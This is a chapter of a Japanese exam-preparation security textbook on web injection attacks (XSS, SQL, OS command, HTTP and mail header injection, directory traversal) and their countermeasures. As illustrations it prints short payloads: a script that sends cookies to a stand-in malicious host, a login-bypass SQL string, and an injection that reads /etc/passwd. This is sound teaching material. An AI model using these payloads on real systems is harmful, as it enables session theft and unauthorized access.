# Webアプリケーションに不正なスクリプトや命令を実行させる攻撃

## 2.8 Webアプリケーションに不正なスクリプトや命令を実行させる攻撃

近年、Webアプリケーションの入力データチェックの不備などの脆弱性を突いて、不正なスクリプトや命令を実行させる攻撃が多発している。ここでは、そうした攻撃の手口と対策について解説する。

### 2.8.1 不正なスクリプトや命令を実行させる攻撃

Webアプリケーションに不正なスクリプトや命令を実行させる攻撃には、次のようなものがある。

- クロスサイトスクリプティング(XSS)
- SQLインジェクション
- OSコマンドインジェクション
- HTTPヘッダインジェクション
- メールヘッダインジェクション
- ディレクトリトラバーサル(パストラバーサル)攻撃
- サーバサイドリクエストフォージェリ(SSRF)

これらは、2.5節のセッションハイジャックと併せて、Webサイト運営における大きな脅威となっている。なかでもSQLインジェクションは、Webサーバの背後にあるデータベースを操作したり、データベースに登録された個人情報などを不正に取得したりすることを可能にするものであり、実害も数多く報告されている。

なお、上記の攻撃手法のほかに、Webアプリケーションのユーザ認証やセッション管理の不備を突いて、サイトの利用者にWebアプリケーションに対する不正な処理要求を行わせるクロスサイトリクエストフォージェリ(CSRF)がある(3.6.2項のColumnを参照)。

> **参照**
> Webアプリケーションの脆弱性とその対策の詳細については、第3章を参照。

### 2.8.2 クロスサイトスクリプティング(XSS)

クロスサイトスクリプティング(XSS:Cross Site Scripting)とは、Webアプリケーションにおける入力データの処理や、Webページを操作するJavaScriptなどに存在する脆弱性を悪用し、ユーザのPC上で不正なスクリプトを実行させる攻撃である。

XSSにより、Webサイトを閲覧したユーザの個人情報が盗み出される、クライアントPC上のファイルが破壊される、バックドアが仕掛けられる、といったさまざまな被害が引き起こされる可能性がある。

> **試験に出た**
>
> - 情報セキュリティスペシャリスト試験の午後Ⅰ問1で、XSSが出題された。また、別の年度の午後Ⅰ問1でも、XSSに関する問題が出題された。
> - 情報処理安全確保支援士試験の平成29年度・午後Ⅰ問2で、XSSに関する問題が出題された。
> - 情報処理安全確保支援士試験の令和5年度・午後Ⅰ問1で、WebアプリケーションのXSSの脆弱性に起因して発生したインシデントに関する問題が出題された。

#### XSS脆弱性の種類

3.1.1項で解説する、脆弱性の種類を識別するための共通基準であるCWE(Common Weakness Enumeration)では、XSSの脆弱性を次の三つに分類している。

**反射型XSS(非持続的)**

ユーザからのリクエストに含まれるスクリプトに相当する文字列を、Webアプリケーションが当該リクエストへのレスポンスであるWebページ内に、実行可能なスクリプトとして出力してしまうタイプのXSS脆弱性。スクリプトがリクエストの送信者へ返ることから、反射型XSS(Reflected XSS)と呼ばれる。

**格納型XSS(持続的)**

ユーザからのリクエストに含まれるスクリプトに相当する文字列をWebアプリケーションの内部に永続的に保存することにより、当該文字列をWebページ内に実行可能なスクリプトとして出力してしまうタイプのXSS脆弱性。この脆弱性があるWebページをユーザが閲覧するたびに、保存された文字列がスクリプトとして実行されることから、格納型XSS(Stored XSS)と呼ばれる。

**DOM-based XSS**

Webページに含まれる正規のスクリプトによって動的にWebページを操作した結果、意図しないスクリプトをWebページに出力してしまうタイプのXSS脆弱性。Webページを構成するオブジェクトの構造(DOM:Document Object Model)をスクリプトが操作する際に問題が生じることから、DOM-based XSSと呼ばれる。反射型XSSや格納型XSSがサーバ側のWebアプリケーションの出力処理の不備による脆弱性であるのに対し、DOM-based XSSはスクリプトによるWebページ出力処理(DOM操作)の不備による脆弱性である。

> **試験に出た**
> 情報処理安全確保支援士試験の平成30年度・午後Ⅰ問1で、DOM-based XSSの脆弱性に関する問題が出題された。

以降は反射型XSSを中心に解説する。なお、本書でXSSのタイプを明示していない場合には、反射型XSSのことを指す。

#### 反射型XSSの脆弱性の有無を確認する方法

名前・住所・電話番号を入力するWebページを例に、反射型XSSの脆弱性の有無を確認する方法を次に示す。

**① 入力フォームに正常なデータを入力して実行(送信)した場合**

入力したデータがWebアプリケーションによって処理され、そのまま確認画面として表示される。

> **図:反射型XSS脆弱性の確認方法①**
> 検索サイトや掲示板、入力情報の確認画面など、ユーザが入力した情報をそのままWebページとして動的に生成するサイトにおいて、名前・住所・電話番号を入力して送信すると、入力内容がそのまま確認画面に表示される。

> **試験に出た**
> 情報処理安全確保支援士試験の午後問3で、Webアプリケーションに存在するXSSなどの脆弱性とその対策に関する問題が出題された。

**② 住所入力欄にアラートを表示するスクリプトを入力して実行した場合**

- **反射型XSSの脆弱性がないサイト**
  入力したスクリプトがWebサーバでは単なる文字列として処理され、確認画面にもそのまま文字列として表示される。

> **図:反射型XSS脆弱性の確認方法②**
> 住所欄に `<script>alert('hello')</script>` と入力して送信すると、確認画面の住所欄にその文字列がそのまま表示される。

- **反射型XSSの脆弱性があるサイト**
  入力したスクリプトが実行され、アラートがポップアップ表示される。

> **図:反射型XSS脆弱性の確認方法③**
> 住所欄に `<script>alert('hello')</script>` と入力して送信すると、ブラウザ上で「hello」というアラートダイアログがポップアップ表示される。

反射型XSSの脆弱性があるサイトでは、入力データのチェックが適切に行われていないため、上図のようにしてスクリプトを入力すれば、クライアント環境でさまざまな処理を実行できることになる。

上記の例のような送信フォームの入力データは、多くの場合(GETメソッドで送信される場合)、次のようにURLのクエリ文字列として送信される。

```
http://www.example.com/cgi-bin/confirm.cgi?address=<script>alert('hello')</script>
```

これを応用すれば、悪意あるサイト「`http://www.malicious-site.com/`」が開設しているWebページや送信したメールの中に、次のようなスクリプトを含めた反射型XSS脆弱性のあるサイト(`http://www.example.com/`)へのリンクを埋め込んでおき、それをクリックさせることで、「`http://www.example.com/`」からクライアントに発行されたCookieを悪意あるサイト「`http://www.malicious-site.com/`」に転送させて盗むことが可能となる。

```html
<script>
location.replace("http://www.malicious-site.com/cgi-bin/getcookie.cgi?cookie=" + document.cookie);
</script>
```

実際には、このスクリプトを反射型XSS脆弱性のあるサイト「`http://www.example.com/`」で実行させる必要があるため、次のようなリンクを、攻撃者が開設したサイトや掲示板、ターゲットとなるユーザへのメールの本文などに埋め込んでおく。

```
http://www.example.com/bbs/board.cgi?param=<script>location.replace("http://www.malicious-site.com/cgi-bin/getcookie.cgi?cookie="+document.cookie);</script>
```

> **注)** 紙面の都合上、上記のスクリプトおよびURLは一部改行して示す場合があるが、実際には1行で記述する。また、実際の攻撃では、URL中の記号はURLエンコードされることが多い。

> **図:反射型XSSの実行イメージ**
>
> 1. 攻撃者が、罠のリンクを埋め込んだWebページを悪意あるサイトに開設する(またはメールを送信する)。
> 2. ユーザがそのページを閲覧し、罠のリンクをクリックする。
> 3. ユーザのブラウザから、スクリプトを含むリクエストが脆弱なWebサイト(`www.example.com`)に送信される。
> 4. 脆弱なWebサイトは、スクリプトを含んだWebページをレスポンスとして返す。
> 5. ユーザのブラウザ上でスクリプトが実行され、`www.example.com` のCookieが悪意あるサイト(`www.malicious-site.com`)に送信される。

このように、二つのサイトにまたがって、最終的にクライアント環境で不正なスクリプトが実行されることから、クロスサイトスクリプティングという名が付けられている。

なお、格納型XSSでは、不正なスクリプトがあらかじめターゲットのWebサイトに格納されているため、クライアントからのリクエスト(上図の③)にはスクリプトは含まれない。

Cookieの漏えいを防ぐため、標準では「`http://www.example.com/`」から発行されたCookieは同サイトのページからのみ読込みができるようになっている(実際にはCookieのdomain属性で有効範囲を設定可能)。しかし、XSSでは当該サイトのページ上でスクリプトが実行されるため、クライアント上で実行されるスクリプトによってCookieを読み出され、第三者が入手できてしまうことになる。

また、XSSでは、スクリプトによってWebページの内容を書き換えることもでき、ページ上に入力欄を設けたり、ボタンを追加したりすることなども可能である。そうしたことから、近年では反射型XSSの脆弱性を悪用することで、正規のページには存在しないクレジットカード番号の入力欄を追加した偽のページを作り出し、フィッシング詐欺を行う事件なども発生している。

XSSへの対策としては、Webアプリケーションで行うものと、通信経路上で行うものがある。

#### Webアプリケーションでの対策

反射型XSS、格納型XSSの基本的な対策を次に挙げる。

1. HTTPレスポンスヘッダのContent-Typeフィールドに文字コードを指定する
2. タグの属性値を必ずダブルクォート(二重引用符)で囲む
3. タグの属性値などに含まれるメタキャラクタのエスケープ処理を行う

HTTPレスポンスヘッダのContent-Typeフィールドには、「`Content-Type: text/html; charset=UTF-8`」のように、文字コード(charset)を指定できる。これを省略した場合、ブラウザは独自の方法で文字コードを推定して表示処理を行う。攻撃者はこの挙動を悪用して、ある文字コードで解釈した場合にスクリプトのタグとなるような文字列を埋め込む可能性がある。

例えば、UTF-7では、「`<`」を「`+ADw-`」、「`>`」を「`+AD4-`」のように表記できる。そのため、文字セットとしてUTF-7が指定されているか、あるいは文字セットが明示されていないと、攻撃者がUTF-7でエンコードされたスクリプトを混入させることができる可能性がある。①はこうした問題を防ぐための対策である。

②は、属性値を一連の文字列として扱うために必須である。属性値を引用符で囲まない場合、入力値に空白などが含まれると、そこで属性値が終了したものと解釈され、イベントハンドラなどの新たな属性を追加されてしまうおそれがある。

③のエスケープ処理とは、HTML上で特別な意味を持つ「`<`」「`>`」「`&`」「`"`」「`'`」などのメタキャラクタを、「`&lt;`」「`&gt;`」などの文字参照に置き換えて、単なる文字として表示させることである。入力データを無害化(消毒)することから、このような対処方法を「サニタイジング」と呼ぶこともある。

同じ文字であっても、HTMLのテキスト部とタグの属性値などでは、エスケープ処理の方法が異なる。そのため、入力データを受け付けた時点ではなく、出力データ(HTML)を生成する際に、出力箇所に応じたエスケープ処理を行う必要がある。

**HTMLテキスト部のエスケープ処理の例**

| 元の文字 | 置換後 |
| --- | --- |
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |

**HTMLタグの属性値のエスケープ処理の例**

| 元の文字 | 置換後 |
| --- | --- |
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

> **試験に出た**
>
> - 情報セキュリティスペシャリスト試験の午後Ⅰ問3で、HTMLの出力箇所に応じた個別のXSS対策に関する問題が出題された。
> - 情報セキュリティスペシャリスト試験の平成23年度に、XSSのエスケープ処理に関する問題が出題された。

#### HTMLタグの特定の属性などにおける注意事項

次に示す特定の属性や箇所において利用者からの入力値を出力する場合は、上記のエスケープ処理のみではXSSの対策として不十分である。

- aタグのhref属性
- imgタグのsrc属性
- タグのstyle属性
- タグのイベント属性(イベントハンドラ)
- スクリプトの文字列

これらの箇所に入力値を出力する場合には、エスケープ処理に加えて、出力する値が想定した形式であるかどうかを検証するなど、出力箇所の文脈に応じて処理するようにする必要がある。

例えば、href属性やsrc属性であれば、「`http://`」「`https://`」で始まる文字列、または「`/`」で始まる相対パスの文字列であることを確実にする必要がある(「`javascript:`」スキームなどを排除するため)。style属性、イベント属性であれば、「`'`」「`"`」「`\`」「`;`」「`:`」「`(`」「`)`」などのメタキャラクタをエスケープ処理する必要がある。

情報セキュリティスペシャリスト試験の平成24年度春期・午後Ⅰ問1で、外部からの入力値をイベントハンドラの属性値に埋め込んで動的にスクリプトを生成し、ダイアログボックスを表示するプログラムにおけるエスケープ処理方法について出題された。同プログラムの該当箇所は次のとおりである。

```java
out.println("<a name=\"#\" onclick=\"alert('" + escape(word) + "')\">");
out.println("Previous search word");
out.println("</a>");
```

※「`word`」は外部からの入力値(文字列リテラル)が格納された変数、「`escape()`」はエスケープ処理を行う関数である。

このような場合には、まずスクリプトの文字列リテラルに対するエスケープ処理(下記)を行い、続いてHTMLタグの属性値に対するエスケープ処理を行う必要がある。

**スクリプトの文字列リテラルに対するエスケープ処理の例**

| 元の文字 | 置換後 |
| --- | --- |
| `\` | `\\` |
| `'` | `\'` |
| `"` | `\"` |
| 改行 | `\n` |

> **リテラル**
> プログラムのソースコード中に直接記述された、数値や文字列などの値のこと。文字列リテラルは、「`'`」や「`"`」などの引用符で囲んで記述する。

上記のプログラムを前提とした場合、スクリプトに引き渡す文字列を「`'`」(シングルクォート)で囲っていることから、これをコード中で閉じる「`'`」を入力されると、文字列リテラルが途中で終了してしまう。例えば、利用者が入力した文字列(word)が「`\');alert(document.cookie)//`」で、かつ「`'`」→「`\'`」の置換は行っているものの「`\`」→「`\\`」の置換を行っていないと、出力結果は次のようになる。

```html
<a name="#" onclick="alert('\\');alert(document.cookie)//')">Previous search word</a>
```

これを実行した場合、画面上の「Previous search word」のテキストをクリックすると、最初に「`\`」のダイアログが表示され、「OK」をクリックすると、続いて空のダイアログボックス(Cookieを使用している場合にはCookieの値)が表示されてしまう。すなわち、入力値中の「`\`」と置換で付加された「`\`」が組み合わさって「`\\`」(1文字の「`\`」)と解釈され、その直後の「`'`」で文字列リテラルが閉じられるため、不正なスクリプトが実行されてしまうことになる。

ここで、「`\`」→「`\\`」の置換を行っていた場合には、出力結果は次のようになる。

```html
<a name="#" onclick="alert('\\\');alert(document.cookie)//')">Previous search word</a>
```

> **注)** 実際のプログラムでは、この後さらにHTMLタグの属性値に対するエスケープ処理が行われるが、ここでは説明を簡単にするため省略している。

これを実行した場合、画面上の「Previous search word」のテキストをクリックすると、「`\');alert(document.cookie)//`」という文字列のダイアログボックスが表示されるのみとなり、不正なスクリプトの実行は回避できる。

なお、「`'`」のエスケープ方法として、「`\'`」ではなく、Unicodeエスケープシーケンスを用いて「`\u0027`」に置換する方法もある。上記のプログラムで利用者の入力した文字列(word)が「`\');alert(document.cookie)//`」であった場合、このエスケープ方法では出力結果は次のようになる。

```html
<a name="#" onclick="alert('\\\u0027);alert(document.cookie)//')">Previous search word</a>
```

これを実行した場合、「Previous search word」のテキストをクリックすると、同様に「`\');alert(document.cookie)//`」という文字列のダイアログボックスが表示されるのみとなり、不正なスクリプトの実行は回避できる。

#### HTTPレスポンスヘッダによるXSS対策

1.4.7項にあるように、Webサーバ側で次のようなHTTPレスポンスヘッダを返すことにより、XSSによる攻撃を防いだり、制限したりすることが可能である。

- **X-XSS-Protection**
  反射型XSS攻撃を検出したときに、ページの読み込みを停止する。
- **Content-Security-Policy**
  スクリプトの読み込みを許可するドメインをポリシとして指定することで、悪意のあるスクリプトが読み込まれるのを防ぐ。

> **補足**
> X-XSS-Protectionはブラウザ内蔵のXSSフィルタを制御するヘッダであるが、現在の主要なブラウザではXSSフィルタ自体が廃止されており、実質的な効果は期待できない。現在はContent-Security-Policyによる対策が推奨されている。

> **試験に出た**
> 情報処理安全確保支援士試験の午後問1で、Content-Security-Policyに関する問題が出題された。

#### HttpOnly属性によるCookieの漏えい対策

発行するCookieにHttpOnly属性を設定しておくと、そのCookieの適用範囲をHTTP/HTTPS通信だけに限定し、ブラウザなどで実行されたスクリプトが `document.cookie` を用いてアクセスすることを禁止する。これにより、XSSによってCookieが盗まれるのを防ぐことが可能となる。

```
Set-Cookie: SESSIONID=abc123; Secure; HttpOnly
```

ただし、この対策を実施するうえで、次のような点に留意しておく必要がある。

1. HttpOnly属性に対応していないブラウザの存在
2. TRACEメソッドによるCookie取得の可能性

①については、旧バージョンのブラウザを使用している場合にはHttpOnly属性が有効に機能せず、Cookieが盗まれる可能性がある。

②については、WebサーバにおいてTRACEメソッドが有効であり、かつXSSの脆弱性があると、「クロスサイトトレーシング(XST:Cross Site Tracing)」と呼ばれる攻撃により、Cookieが盗まれる可能性がある。TRACEメソッドは受信したリクエストの内容をそのままレスポンスとして返すため、スクリプトからTRACEリクエストを送信させると、HttpOnly属性が設定されたCookieもレスポンスに含まれて取得されてしまう。対策としては、WebサーバでTRACEメソッドを無効化することが挙げられる。なお、現在の主要なブラウザでは、スクリプト(XMLHttpRequestなど)からTRACEメソッドを送信することが禁止されているため、XSTが成立する危険性は低い。

> **試験に出た**
> 情報処理安全確保支援士試験の午後問1で、HttpOnly属性に関する問題が出題された。

#### 通信経路上での対策

反射型XSSへの対策として、通信経路上で行うものもある。それは、Webアプリケーションファイアウォール(WAF)を用いて、反射型XSSの脆弱性を突いた攻撃を遮断するという方法である。

#### DOM-based XSSの仕組み

情報セキュリティスペシャリスト試験の平成26年度秋期・午後Ⅰ問2で、DOM-based XSSの例とその対策について出題され、問題文には下図のHTML(`http://www.example.jp/domxss.html`)とURIが示された。

```html
<html>
<body>
<script>
document.write(decodeURIComponent(location.hash));
</script>
</body>
</html>
```

図:HTML(`http://www.example.jp/domxss.html`)の例

```
http://www.example.jp/domxss.html#<script>alert(1)</script>
```

図:URIの例

> **URI**
> URI(Uniform Resource Identifier:統一資源識別子)は、一定の書式によってインターネット上に存在する情報資源の場所を一意に指し示す識別子。URL(Uniform Resource Locator)の考え方を拡張したもので、http、ftpなどのスキーム名で始まり、「:」で区切った後にスキームごとの書式に従って資源の場所を記述する。

上図「URIの例」のURIにブラウザからアクセスすると、上図「HTML(`http://www.example.jp/domxss.html`)の例」のHTMLの4行目の記述により、URIの「`#`」以降の部分(フラグメント識別子)がHTMLとして出力されてスクリプトが実行され、その結果「1」という警告ダイアログが表示される。

このように、`document.write` メソッドや `innerHTML` プロパティなどは、引数や値として渡した文字列にHTMLタグやスクリプトに相当する文字列が含まれていれば、それをHTMLとして解釈するため、Webページの構造(DOMツリー)を意図せず動的に変更してしまう可能性がある。

#### DOM-based XSSの対策

DOM-based XSSの対策としては、上記のようなメソッドやプロパティを使用するのではなく、`createElement`、`createTextNode` などのDOM操作用のメソッドや、`textContent` などのプロパティを使用してWebページを構築することである。

仕様上どうしても `document.write` や `innerHTML` などのメソッドやプロパティを使用する必要がある場合は、出力箇所の文脈に応じてエスケープ処理を組み込む。例えば、href属性やsrc属性の値の一部として文字列を出力する場合は、URIとして使用できない文字をURLエンコード(パーセントエンコード)する必要がある。

また、DOM-based XSSの脆弱性は独自開発されたWebページに限らず、jQueryなどのJavaScriptライブラリの古いバージョンにも存在することが分かっている。そのため、JavaScriptライブラリを新しいバージョンにアップデートすることも必要である。

なお、反射型XSSについては、スクリプトを含むデータを対象となるWebアプリケーションに入力し、その結果、Webサイトからの応答中に有効なスクリプトとして出力されているかどうかを確認することで、脆弱性の有無を判定する。

一方、DOM-based XSSの場合は、攻撃者が注入するデータ(不正なスクリプトなど)がWebサイトからの応答中に出力されない。そのため、反射型XSSと同じ方法では脆弱性の有無を診断することはできない。DOM-based XSSの脆弱性については、「`#`」から始まるフラグメント識別子を使うスクリプトの存在を確認のうえ、ソースコードレビューなどによってその処理内容を検証する必要がある。

また、フラグメント識別子はブラウザからWebサーバへ送信されないため、WAFを用いて攻撃を検知し、遮断することも困難である。

> **Column:メタキャラクタ、エスケープ処理、エスケープシーケンス**
>
> Perl、Java、ECMAScriptなどのスクリプト言語やプログラム言語で広く用いられる正規表現や、UNIXで用いるシェル、SQL文などで、何らかの特別な働きをする文字をメタキャラクタという。
>
> メタキャラクタには、次のような種類がある。
>
> `.` `*` `+` `?` `^` `$` `|` `\` `(` `)` `[` `]` `{` `}` `'` `"` `;` `&` `<` `>` など
>
> これらの文字を単なる文字として扱いたい場合には、それぞれの言語などによって定められた方法で処理することで、メタキャラクタとしての働きを失わせる。これをエスケープ処理という。
>
> 例えば、「`.`」は正規表現で「任意の1文字」を表すが、これを単なる文字(ピリオド)として扱う場合は「`\.`」と記述する。
>
> エスケープ処理された「`\.`」などの文字の並びを、エスケープシーケンスという。

> **Column:不正なサイトに誘導したり意図しない処理を実行させたりする手口**
>
> 近年、偽りの電話や文書で相手を騙し、金銭を振り込ませる詐欺行為が社会問題化している。インターネットの世界でも、人を騙して不正なサイトに誘導したり、意図しない処理を実行させたりする攻撃が横行している。例えば、次のような手口がある。
>
> **● フィッシング(Phishing)**
>
> 銀行、クレジットカード会社、ショッピングサイトなどからの連絡を装ったメールを送付し、本物のサイトに酷似した悪意あるページへのリンクを貼り付け、口座番号やクレジットカード番号、パスワードなどを入力させて盗んでしまうという詐欺行為。メール受信者を騙すために、次のような手口が使われている。
>
> - 信頼できる組織からのメールであるかのように送信元アドレスを詐称する
> - 正規のドメイン名に酷似したドメイン名を取得して偽サイトを開設する
> - HTMLメールを用いて、表示上のリンク文字列と実際のリンク先を異なるものにする
> - 「アカウントが停止されます」などと緊急性を装い、冷静な判断をさせないようにする
>
> 最近では、まずITサービスベンダーの担当者を装った偽の電話をかけ、「これから送るメールのリンクをクリックして、認証に関する設定を変更してください」と伝えたうえでフィッシングサイトに誘導する手口や、URLをQRコードで送ることで、メールのセキュリティチェックをすり抜ける手口なども横行している。
>
> **● クリックジャッキング攻撃**
>
> Webサイトのコンテンツ上に、iframeなどで透明化したレイヤに標的サイトのコンテンツを重ねて配置することにより、利用者を視覚的に騙して不正な操作を実行させる攻撃。
>
> この攻撃への有効な対策として、Webサイト側がHTTPレスポンスヘッダにX-Frame-Optionsを含める方法と、Content-Security-Policyを含める方法がある。X-Frame-Optionsは、frameまたはiframeでページを表示することの可否を指定する仕組みである。同ヘッダに「DENY」を設定すると、frameまたはiframeでページを表示することを一切禁止する。「SAMEORIGIN」を指定すると、アドレスバーに表示されたドメインと同じドメインの場合に限り、frameまたはiframeでの表示を許可する。
>
> Content-Security-Policyは、クリックジャッキング対策だけでなく、クロスサイトスクリプティング対策などにも用いられているもので、frame-ancestorsディレクティブを用いることで、X-Frame-Optionsと同様に、frameまたはiframeでページを表示することを許可するドメインを限定することが可能である。
>
> **● SEOポイズニング**
>
> SEO(Search Engine Optimization:検索エンジン最適化)とは、対象サイトのHTMLにキーワードを効果的に埋め込むなどして、検索エンジンの検索結果の上位に表示されるように工夫すること。SEOポイズニング(汚染)とは、検索エンジンの順位付けアルゴリズムを悪用して、利用者をマルウェアに感染させるような悪意のあるサイトを検索結果の上位に表示させる行為である。

### 2.8.3 SQLインジェクション

SQLインジェクションとは、次のような仕組みのWebページを狙う攻撃手法である。

- ユーザの入力データを基にSQL文を編集する
- 編集したSQL文でデータベース（DB）にクエリを発行し、その結果を表示する

こうしたWebページに不正なSQL文を入力すると、DBの改ざんや、DBに登録された個人情報などの不正取得が可能になる。

**図：SQLインジェクションの実行イメージ**

```
攻撃者 ──(不正な入力データ)──▶ Webサーバ（Webアプリケーション）
                                  │ 不正なSQL文を編集・発行
                                  ▼
                               DBサーバ ──▶ データの改ざん・漏えい
```

#### SQLインジェクションの実行方法

ユーザ名とパスワードの入力欄を設け、その入力値から次のようなSQL文を編集するページを例に、SQLインジェクションの実行例を示す。

```sql
SELECT * FROM users WHERE name = '(入力されたユーザ名)' AND passwd = '(入力されたパスワード)'
```

**① 正常な入力データの例**

- ユーザ名：`SHOEISHA`
- パスワード：`password`

編集されたSQL文：

```sql
SELECT * FROM users WHERE name = 'SHOEISHA' AND passwd = 'password'
```

**② 不正な入力データによるSQLインジェクションの例**

- ユーザ名：`SHOEISHA`
- パスワード：`' OR 'a' = 'a`

編集されたSQL文：

```sql
SELECT * FROM users WHERE name = 'SHOEISHA' AND passwd = '' OR 'a' = 'a'
```

②では、`'a' = 'a'`という常に真となる条件がOR結合される。そのため、WHERE句全体が常に真となり、パスワードを知らなくても認証を突破できてしまう。

アプリケーションが「`'`」「`;`」「`%`」「`+`」など、SQL文として意味をもつ文字をそのまま受け入れてしまう場合、不正なSQL文をいとも簡単に編集できる。

上記の問題に加え、次の2つもSQLインジェクションの被害を招く原因となるため、対策が必要である。

- **データベースのアクセス権設定**
  Webアプリケーションに、DBの操作に必要以上の権限（管理者権限など）が与えられていると、不正なSQL文が実行される可能性が高まる。
- **Webサーバのエラーメッセージ処理設定**
  SQL文の実行時にDBでエラーが発生したとき、詳細なエラーメッセージをクライアント（ブラウザ）に返す設定になっていると、攻撃者に有益な情報を与えてしまうおそれがある。この脆弱性を悪用し、DBサーバ上で意図的にエラーを発生させ、表示されるエラーメッセージから情報を盗む手法（エラーベースのSQLインジェクション）などもある。

#### SQLインジェクションへの対策

SQLインジェクションへの対策には、次のようなものがある。

**Webアプリケーションでの対策①（バインド機構の使用）**

1. 変数部分にプレースホルダと呼ばれる特殊文字（「`?`」など）を使用して、SQL文の雛形をあらかじめ用意しておく。
2. 後からそこに実際の値を割り当てる。

割り当てられる変数は、完全な数値定数又は文字列定数として扱われる。そのため、変数の中にSQL文として特別な意味をもつ文字が含まれていても、それらは自動的にエスケープ処理され、単なる文字として認識される。

### 2.8.4 OSコマンドインジェクション

OSコマンドインジェクションとは、ユーザの入力データを基にOSのコマンドを呼び出して処理するWebページにおいて、不正なコマンドを入力する攻撃手法である。これにより、任意のファイルの読出し・変更・削除、パスワードの不正取得などが行われる。

#### OSコマンドインジェクションの実行方法

OSのコマンドの呼出しには、言語ごとに用意されている関数などを使用する。

**表：OSのコマンドを実行する関数の例**

| 言語 | 関数・構文 |
| --- | --- |
| Perl | `open()`（パイプ指定時）、`` `command` ``（バッククォート）、`system command`、`exec command` |
| C/C++ | `system(command)`、`exec(command)`（`execl`、`execv`等の関数群） |
| PHP | `` `command` ``（バッククォート）、`system(command)`、`exec(command)`、`shell_exec(command)`、`passthru(command)`、`popen(command)` |

※ commandは実行するコマンド（指定方法やパラメータは関数ごとに異なる）

例えば、Perlのopen関数は、ユーザが指定したファイルの操作（読込み、書込みなど）に使用されることが多い。しかし、パラメータの指定によっては外部コマンド（OSコマンド）を呼び出せる。これを悪用されると、任意のコマンドが実行されるおそれがある。

```
入力値：  report.txt; cat /etc/passwd
実行内容：cat report.txt; cat /etc/passwd   ← 2つ目のコマンドも実行されてしまう
```

> **補足**：「`;`」「`|`」「`&`」「`` ` ``」「`$( )`」などは、シェルにおいてコマンドの連結や置換を意味するメタキャラクタである。これらを含む入力がシェルに渡されると、OSコマンドインジェクションが成立しやすい。

#### OSコマンドインジェクションへの対策

OSコマンドインジェクションへの対策には、次のようなものがある。

**Webアプリケーションでの対策**

- OSコマンドの呼出しが可能な関数を極力使用しない（シェルを起動しない）
- 入力データに使用できる文字種や書式などのルールを明確にする（文字種を極力制限する）
- 上記のルールに沿って入力データをチェックする

**通信経路上での対策**

- Webアプリケーションファイアウォールを用いて、OSコマンドインジェクションを遮断する

### 2.8.5 HTTPヘッダインジェクション

HTTPヘッダインジェクションとは、ユーザの入力データを基にHTTPレスポンス（メッセージヘッダ、メッセージボディ）を生成するWebアプリケーションを狙う攻撃手法である。不正なデータを入力することで、次のような攻撃を行う。

- 任意のヘッダフィールドを追加する
- 任意のメッセージボディを追加する
- 複数のレスポンスに分割する

なお、HTTPレスポンスに改行コード（CR+LF：`%0d%0a`）を追加して複数のレスポンスを作り出す攻撃は、**HTTPレスポンス分割**（HTTP Response Splitting）とも呼ばれる。

> **試験対策メモ**：情報処理安全確保支援士試験の午後問題では、HTTPヘッダインジェクションを題材にした問題が出題されている。HTTPメッセージの構造（ヘッダ、ボディ）については、関連項目を参照のこと。

#### HTTPヘッダインジェクションによる攻撃例

HTTPヘッダインジェクションにより、次のような攻撃が可能となる。

- ユーザのブラウザに偽の情報を表示
- 不正なスクリプトの組込み
- 任意のCookieの発行
- キャッシュサーバのキャッシュの汚染

HTTPレスポンスのヘッダ情報には「`Set-Cookie`」や「`Location`」などがある。これらの生成にユーザの入力データを用いていて、かつその入力データのチェックに不備があると、任意のヘッダフィールドを挿入されてしまう。

```
リクエスト：
GET /redirect?url=http://example.com/%0d%0aSet-Cookie:%20SID=attacker HTTP/1.1

生成されるレスポンス：
HTTP/1.1 302 Found
Location: http://example.com/
Set-Cookie: SID=attacker        ← 攻撃者が挿入したヘッダ
```

#### HTTPヘッダインジェクションへの対策

HTTPヘッダインジェクションへの対策には、次のようなものがある。

- HTTPレスポンスヘッダをWebアプリケーションから直接出力せず、実行環境や言語に実装されているヘッダ出力用のAPIやライブラリを使用する
- 上記のAPIやライブラリを使うかどうかにかかわらず、HTTPレスポンスヘッダの生成に用いるユーザ入力データについて改行コードをチェックし、含まれていた場合は削除する
- Cookieを発行する場合は、URLエンコードを確実に行う

### 2.8.6 メールヘッダインジェクション

メールヘッダインジェクションとは、ユーザがフォームに入力したデータを基にメールを送信するWebアプリケーションを悪用する攻撃手法である。不正なメールヘッダを混入させ、意図していないアドレスに迷惑メールを送信するなどの攻撃を行う。

通常、このようなWebアプリケーションでは、送信先のメールアドレスは固定されており、管理者以外は変更できない。しかし、実装上の脆弱性があると、第三者が送信先を自由に指定できてしまう場合がある。

#### メールヘッダインジェクションによる攻撃例

次のようなメール送信プログラムを考える。

- 送信先のアドレス（To）は固定
- 送信者のアドレス（From）と本文はフォームから入力する

このプログラムで、送信者のアドレスとして改行コードとメールヘッダを含む文字列を入力すると、意図していないアドレスにまでメールが送信されるおそれがある。

例えば、次のような仕様のメール送信アプリケーションを想定する。

| 項目 | 内容 |
| --- | --- |
| Toアドレス | `aite@aaaa.bbb`（固定） |
| Fromアドレス | フォームからの入力値 |
| 本文 | フォームからの入力値 |

ここで、Fromアドレスとして次の文字列を入力したとする。

```
uehara@ssss.ttt%0d%0aBcc: user@xxxx.yyy
```

すると次のようなメールヘッダが生成され、意図しないアドレス（`user@xxxx.yyy`）にまでメールが送信されてしまう。

```
To: aite@aaaa.bbb
From: uehara@ssss.ttt
Bcc: user@xxxx.yyy
```

#### メールヘッダインジェクションへの対策

メールヘッダインジェクションへの対策には、次のようなものがある。

- メールヘッダをすべて固定値にし、ユーザの入力値をメールヘッダに出力しない
- Webアプリケーションの実行環境や言語に実装されているメール送信用のAPIを使用する（ただし、APIによっては改行コードの取扱いが不適切なものもあるため注意が必要）
- hiddenフィールドなど、改ざんが容易な場所にメール送信先のアドレスを設定しない
- メールヘッダとして用いるユーザ入力データについて改行コードをチェックし、含まれていた場合は削除する

### 2.8.7 ディレクトリトラバーサル攻撃

ディレクトリトラバーサル攻撃（パストラバーサル攻撃とも呼ばれる）は、次のような仕組みのWebアプリケーションを狙う攻撃である。

- ユーザの入力データなど、ファイル名として使用する文字列を外部から受け取る
- その文字列を使ってWebサーバ内のファイルにアクセスする

攻撃者は、ファイル名の先頭に「`../`」や「`..\`」など上位のディレクトリを意味する文字列を付けて入力する。これにより、本来アクセスを想定していないディレクトリ内のファイルに不正にアクセスする。

